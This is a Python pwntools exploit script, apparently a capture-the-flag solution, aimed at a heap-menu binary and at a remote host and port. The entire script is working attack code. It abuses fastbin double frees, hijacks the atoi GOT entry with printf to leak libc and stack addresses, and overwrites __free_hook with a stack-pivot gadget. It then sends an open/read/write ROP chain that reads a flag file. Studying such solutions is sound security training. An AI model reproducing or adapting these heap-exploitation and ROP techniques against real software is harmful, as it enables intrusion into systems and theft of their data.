from pwn import *
from sys import *

context.clear(arch='amd64')

elf = ELF('./chall')
libc = ELF('libc.so.6')

p = process('./chall')
HOST = '103.152.242.172'
PORT = 60902

cmd = """
b*main
b*0x7ffff7ee8938
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

def add(size,msg):
	p.sendlineafter("> ", '1')
	p.sendlineafter(": ", str(size))
	p.sendafter("msg : ", msg)

def pradd(size,msg):
	p.sendlineafter("> ", '')
	p.sendlineafter(": ", '%{}c'.format(str(size)))
	p.sendafter("msg : ", msg)

def delete(idx):
	p.sendlineafter("> ", '2')
	p.sendlineafter(": ", str(idx))


#fastbin1
add(0x48,p64(0xdeadbeef)*8)
for i in range(1,9):
	add(0x48,b"A"*8) #0-9

for i in range(7):
	delete(i) #fill tcache

delete(7)
delete(8)
delete(7) #trigger double free

#fastbin2
for i in range(10):
	add(0x58,b".\x00") #10-19

for i in range(10,17):
	delete(i)

delete(17)
delete(18)
delete(17)

#fastbin3
for i in range(10):
	add(0x68,b".\x00")

for i in range(20,27):
	delete(i)

delete(27)
delete(28)
delete(27)

#overwrite ATOI -> printf and leak
log.info("OVER WRITE ATOI -> PRINTF AND LEAK")
for i in range(7):
	add(0x48,b".\x00")

add(0x48,p64(elf.got['atoi']))

for i in range(2):
	add(0x48,b".\x00")

add(0x48,p64(elf.sym['printf']))

#b'0x7ffff7dbb0b3[!] try again\n\n1. create\n2. delete\n3. exit\n\n> ' 13
#b'0x7fffffffdee0[!] try again\n\n1. create\n2. delete\n3. exit\n\n> ' 10
p.send(b"%13$p|%10$p")
p.recvuntil(b"> ")

res = p.recvuntil(b"[!]")
res = res[:-3].split(b"|")
libc.address = eval(res[0]) - 0x270b3
stack = eval(res[1])
context = 0x000000000005e650+libc.address #: mov rsp, rdx; ret; 
pop_rdi = libc.address + 0x0000000000026b72
pop_rdx_r12 = libc.address + 0x000000000011c371
pop_rsi = libc.address + 0x0000000000027529

log.info("LEAK")
print(hex(stack),hex(libc.address))

log.info("CLEAR")
p.send(b"\x00"*16)

#overwrite freehook
log.info("OVERWRITE FREE_HOOK TO GADGET ROP")
for i in range(7):
	pradd(80,p64(0xdeadbeef))

pradd(80,p64(libc.sym['__free_hook']))

for i in range(2):
	pradd(80,b"A"*8)

pradd(80,p64(0x0000000000154930+libc.address))  #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
pradd(0x88,p64(pop_rdx_r12)+p64(elf.bss()+0x500-0x20))
pradd(0x88,p64(context))

log.info("CLEAR")
p.send(b"\x00"*16)

#bss to rop
log.info("BSS TO ROP PAYLOAD")
for i in range(7):
	pradd(96,p64(0x404580))

pradd(96,p64(0x404580))

for i in range(2):
	pradd(96,p64(0x404580))

payload = p64(pop_rsi)
payload += p64(0x4045c0-0x10)
payload += p64(libc.sym['read'])
pradd(96,p64(pop_rdi)+p64(0x0)+p64(pop_rdx_r12)+p64(0x1000)+p64(context)+payload)

log.info("CLEAR")
sleep(1)
p.send(b"\x00"*16)

sleep(1)
p.send(b"%2c")

sleep(1)
p.send(b"%51c")



log.info("SENDING ROP....")
sleep(3)

def getdent():
	rop = b""
	rop += p64(0x000000000004a550+libc.address) #poprax
	rop += p64(0x4e)
	rop += p64(pop_rdi)
	rop += p64(0x5)
	rop += p64(pop_rsi)
	rop += p64(elf.bss()+0x800)
	rop += p64(pop_rdx_r12)
	rop += p64(0x400)
	rop += p64(0x0)
	rop += p64(0x0000000000066229+libc.address) #syscall
	return rop

def flag():
	rop = b""
	rop += p64(pop_rdi)
	rop += p64(0x5)
	rop += p64(pop_rsi)
	rop += p64(elf.bss()+0x800)
	rop += p64(pop_rdx_r12)
	rop += p64(0x40)
	rop += p64(0)
	rop += p64(libc.sym['read'])
	return rop

rop = b"\x00"*0x10
rop += p64(pop_rdi)
rop += p64(0)
rop += p64(pop_rsi)
rop += p64(elf.bss()+0x800)
rop += p64(pop_rdx_r12)
rop += p64(0x40)
rop += p64(0)
rop += p64(libc.sym['read'])

rop += p64(pop_rdi)
rop += p64(elf.bss()+0x800)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(libc.sym['open'])

#rop += getdent()
rop += flag()

rop += p64(pop_rdi)
rop += p64(0x1)
rop += p64(pop_rsi)
rop += p64(elf.bss()+0x800)
rop += p64(pop_rdx_r12)
rop += p64(0x100)
rop += p64(0x0)
rop += p64(libc.sym['write'])

sleep(1)
p.send(rop)

sleep(1)
p.send(b"flag_i5HR6cBpwxxyTixR.txt\x00") #for open(payload)

p.interactive()